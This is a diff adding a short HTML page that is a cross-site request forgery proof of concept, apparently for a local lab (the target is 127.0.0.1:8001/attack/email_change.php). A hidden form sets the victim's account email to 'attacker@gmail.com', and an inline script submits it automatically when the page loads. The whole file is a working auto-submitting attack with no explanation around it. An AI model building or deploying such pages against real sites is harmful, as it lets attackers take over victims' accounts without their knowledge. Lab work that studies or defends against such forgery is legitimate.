@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+
+    <form method="post" action="http://127.0.0.1:8001/attack/email_change.php" id="form">
+        
+        <input type="hidden" name="new_email" value="attacker@gmail.com">
+        <input type="hidden" name="email_change" value="1">
+
+    </form>
+    <script>
+        
+        document.forms[0].submit();
+        
+    </script>
+</body>
+</html>
